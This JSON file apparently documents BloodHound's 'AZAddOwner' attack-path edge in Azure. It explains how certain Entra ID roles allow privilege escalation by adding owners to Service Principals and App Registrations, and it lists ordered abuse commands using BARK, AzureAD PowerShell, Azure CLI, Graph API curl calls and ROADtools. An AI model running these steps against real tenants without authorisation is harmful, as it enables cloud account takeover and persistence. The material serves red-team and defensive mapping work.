{
    "AZAddOwner": {
        "meaning": "This edge is created during post-processing against all App Registrations and Service Principals within the same tenant when an Azure principal has certain privileged Entra ID roles (Hybrid Identity Administrator, Partner Tier1/2 Support, Directory Synchronization Accounts). This allows adding new owners to Azure objects, which can lead to privilege escalation through ownership control.",
        "common": "",
        "windows": {
            "BARK_ServicePrincipal": [
                {
                    "order": 1,
                    "command": "$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken \"0.ARwA6WgJJ9X2qk...\" -TenantID \"contoso.onmicrosoft.com\"",
                    "description": "Acquire MS Graph-scoped JWT using BARK with refresh token"
                },
                {
                    "order": 2,
                    "command": "New-ServicePrincipalOwner -ServicePrincipalObjectId \"082cf9b3-24e2-427b-bcde-88ffdccb5fad\" -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" -Token $MGToken",
                    "description": "Add new owner to target Service Principal using BARK"
                },
                {
                    "order": 3,
                    "command": "Get-ServicePrincipalOwners -ServicePrincipalObjectId \"082cf9b3-24e2-427b-bcde-88ffdccb5fad\" -Token $MGToken",
                    "description": "Verify new owner was successfully added to Service Principal"
                }
            ],
            "BARK_AppRegistration": [
                {
                    "order": 1,
                    "command": "$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken \"0.ARwA6WgJJ9X2qk...\" -TenantID \"contoso.onmicrosoft.com\"",
                    "description": "Acquire MS Graph-scoped JWT using BARK with refresh token"
                },
                {
                    "order": 2,
                    "command": "New-AppOwner -AppObjectId \"52114a0d-fa5b-4ee5-9a29-2ba048d46eee\" -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" -Token $MGToken",
                    "description": "Add new owner to target App Registration using BARK"
                },
                {
                    "order": 3,
                    "command": "Get-AppOwners -AppObjectId \"52114a0d-fa5b-4ee5-9a29-2ba048d46eee\" -Token $MGToken",
                    "description": "Verify new owner was successfully added to App Registration"
                }
            ],
            "PowerShell_Manual": [
                {
                    "order": 1,
                    "command": "Connect-AzureAD -AccountId user@domain.com",
                    "description": "Connect to Azure AD with privileged account"
                },
                {
                    "order": 2,
                    "command": "Add-AzureADServicePrincipalOwner -ObjectId SERVICE_PRINCIPAL_ID -RefObjectId NEW_OWNER_ID",
                    "description": "Add owner to Service Principal using AzureAD PowerShell"
                },
                {
                    "order": 3,
                    "command": "Get-AzureADServicePrincipalOwner -ObjectId SERVICE_PRINCIPAL_ID",
                    "description": "Verify ownership change was successful"
                }
            ]
        },
        "linux": {
            "Azure_CLI": [
                {
                    "order": 1,
                    "command": "az login --username user@domain.com --password password",
                    "description": "Authenticate to Azure using privileged account"
                },
                {
                    "order": 2,
                    "command": "az ad sp owner add --id SERVICE_PRINCIPAL_ID --owner-object-id NEW_OWNER_ID",
                    "description": "Add owner to Service Principal using Azure CLI"
                },
                {
                    "order": 3,
                    "command": "az ad sp owner list --id SERVICE_PRINCIPAL_ID",
                    "description": "Verify new owner was successfully added"
                }
            ],
            "Microsoft_Graph_API": [
                {
                    "order": 1,
                    "command": "curl -X POST 'https://graph.microsoft.com/v1.0/servicePrincipals/{id}/owners/$ref' -H 'Authorization: Bearer $ACCESS_TOKEN' -H 'Content-Type: application/json' -d '{\"@odata.id\": \"https://graph.microsoft.com/v1.0/users/{user-id}\"}'",
                    "description": "Add owner to Service Principal using Microsoft Graph API"
                },
                {
                    "order": 2,
                    "command": "curl -X POST 'https://graph.microsoft.com/v1.0/applications/{id}/owners/$ref' -H 'Authorization: Bearer $ACCESS_TOKEN' -H 'Content-Type: application/json' -d '{\"@odata.id\": \"https://graph.microsoft.com/v1.0/users/{user-id}\"}'",
                    "description": "Add owner to App Registration using Microsoft Graph API"
                },
                {
                    "order": 3,
                    "command": "curl -X GET 'https://graph.microsoft.com/v1.0/servicePrincipals/{id}/owners' -H 'Authorization: Bearer $ACCESS_TOKEN'",
                    "description": "Verify ownership changes using Graph API"
                }
            ],
            "ROADtools": [
                {
                    "order": 1,
                    "command": "roadrecon auth -u user@domain.com -p password",
                    "description": "Authenticate to Azure AD using ROADtools"
                },
                {
                    "order": 2,
                    "command": "roadrecon gather",
                    "description": "Gather Azure AD information including object ownership"
                },
                {
                    "order": 3,
                    "command": "# Use ROADtools to identify ownership modification opportunities",
                    "description": "Analyze Azure AD structure for ownership-based privilege escalation"
                }
            ]
        }
    }
}
